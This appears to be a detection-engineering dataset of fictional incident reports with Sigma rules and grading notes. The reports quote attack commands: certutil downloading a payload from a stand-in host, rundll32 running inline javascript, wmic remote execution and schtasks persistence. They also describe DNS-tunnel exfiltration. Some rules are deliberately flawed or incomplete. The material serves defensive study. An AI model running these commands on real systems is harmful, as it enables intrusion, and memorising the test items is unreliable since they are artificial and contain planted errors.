evidence: Responders recovered a command line that began with rundll32.exe javascript: and called the mshtml,RunHTMLApplication export
cases.report_text: Harbor Lantern intrusion, workstation LAB-WS-14. The operator avoided dropping a binary and instead abused a signed Windows utility to run script content directly. Responders recovered a command line that began with rundll32.exe javascript: and called the mshtml,RunHTMLApplication export, launched as a child of WINWORD.EXE. The RunHTMLApplication export of mshtml.dll evaluates the inline script, which then retrieved a second stage from stage.harborlantern.test. The same pattern appeared on three other workstations over one weekend. Analysts found no legitimate software in the environment that pairs rundll32.exe with the javascript: scheme, and because the script never touches disk the process command line is the most reliable observable.
cases.sigma_yaml:
title: Rundll32 Evaluating Inline JavaScript via RunHTMLApplication
id: 5c0e7a1d-93b4-4f28-a6d1-9d41c2e7b05g
status: experimental
description: Detects rundll32 evaluating inline script through the mshtml RunHTMLApplication export as seen in the Harbor Lantern intrusion.
references:
  - urn:atidep:case
author: case-author
date: 2026/10/02
tags:
  - attack.stealth
  - attack.t1218.011
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\rundll32.exe'
    CommandLine|contains|all:
      - 'javascript:'
      - 'RunHTMLApplication'
  condition: selection
falsepositives:
  - Legitimate software that embeds script through rundll32 was not observed in the laboratory
level: high
cases.why: The id field is present and has the 8-4-4-4-12 shape of a UUID, but its final character is 'g', which is not a hexadecimal digit, so it is not a valid UUID. Every other field and the detection logic are valid.

evidence: updchk.exe opened outbound TCP connections to 203.0.113.77 on port 8531 roughly every ninety seconds
cases.report_text: CraneMail follow-on activity, finance subnet. After installation the implant, a loader named updchk.exe, stopped using web ports. Network telemetry showed updchk.exe opened outbound TCP connections to 203.0.113.77 on port 8531 roughly every ninety seconds. Port 8531 was not on the approved outbound list for the finance subnet, and the actor appears to have chosen it because the perimeter proxy only inspects traffic on port 443. The traffic itself looked like TLS, with a self-signed certificate. Two other hosts showed the same beaconing pattern the following day. Responders blocked the address at the firewall and quarantined the three hosts, and the implant was not seen again after the block.

evidence: resolving long hex-encoded labels beneath tunnel.vesperline.test
cases.report_text: Vesperline engagement, host LAB-FIN-07. The backdoor moved staged data out of the network over DNS rather than a direct connection. Packet captures and resolver logs showed the process resolving long hex-encoded labels beneath tunnel.vesperline.test, with each query carrying a small slice of the stolen archive in its leftmost label. Query volume peaked at several hundred lookups per minute during the exfiltration window. The parent domain vesperline.test is also used by the vendor for ordinary web hosting, so analysts limited the indicator to the tunnel subdomain. The authoritative name server for tunnel.vesperline.test answered every query with a short TXT or A record, which the backdoor treated as an acknowledgement.

evidence: Responders recovered the command wmic.exe /node:LAB-FS-02 process call create from the jump server
cases.report_text: Moorlight lateral movement review. After obtaining a service account, the operator pivoted from the jump server to file servers using built-in tooling. Responders recovered the command wmic.exe /node:LAB-FS-02 process call create from the jump server, followed by a cmd.exe payload staged under the Temp directory of the target. The same wmic.exe pattern with a different /node: value appeared against LAB-FS-03 twenty minutes later. Using wmic.exe with process call create against a remote node leaves the spawned process as a child of WmiPrvSE.exe on the target, which is why the source-side command line is the better detection point. Local administrators on the jump server were not observed using this form during the baseline period.
cases.sigma_yaml:
title: WMIC Remote Process Creation via Node Switch
id: 18f6d2a9-0c47-4e3b-b5a2-6e91d4c7f082

evidence: The operator downloaded the payload with certutil.exe -urlcache -split -f http://stage.saltmarsh.test/p.bin
cases.report_text: Saltmarsh stage-two retrieval. The operator downloaded the payload with certutil.exe -urlcache -split -f http://stage.saltmarsh.test/p.bin and wrote it to the Public profile directory before running it. The certutil.exe invocation came from an interactive cmd.exe session opened over an RDP connection with stolen credentials. Responders observed the same urlcache and split switches on a second host eleven minutes later, this time pointing at a numeric address in the documentation range rather than a hostname. Certutil is a signed Windows binary, which is why the actor preferred it over a custom downloader, and administrators in this environment normally use it only for certificate and hash tasks.
cases.sigma_yaml:

id: a94e3b17-6d2c-4f80-81b5-3c0e7d29a6f4

evidence: tetherdesk.exe opening outbound connections to the relay address 198.51.100.61
cases.report_text: Alderwick incident, accounting workstation LAB-ACC-03. After phishing, the actor installed a commercial remote access product named TetherDesk so that the operator could interact with the desktop without custom malware. Network telemetry showed tetherdesk.exe opening outbound connections to the relay address 198.51.100.61, which is not part of the vendor's published relay ranges and is attributed to the actor's own relay server. The agent was installed under a user profile directory without administrator rights and was configured to start at logon. The organisation does not license TetherDesk, and a software inventory found no authorised installation anywhere in the estate before the incident.

evidence: Responders recovered the command schtasks.exe /create /tn OneDriveSyncCheck followed by a trigger of /sc onlogon
a binary in a folder named msdrv under ProgramData
cases.report_text: Saltmarsh persistence note, workstation LAB-HR-11. To survive reboots the operator registered a scheduled task instead of writing a Run key. Responders recovered the command schtasks.exe /create /tn OneDriveSyncCheck followed by a trigger of /sc onlogon, with the task action pointing at a binary in a folder named msdrv under ProgramData. The task name was chosen to look like a OneDrive housekeeping job, and the msdrv folder name imitates a driver directory. The same folder name and logon trigger were present on a second HR workstation. Administrators in this environment create scheduled tasks for backups and patching, but none of those tasks use a logon trigger or an msdrv folder.
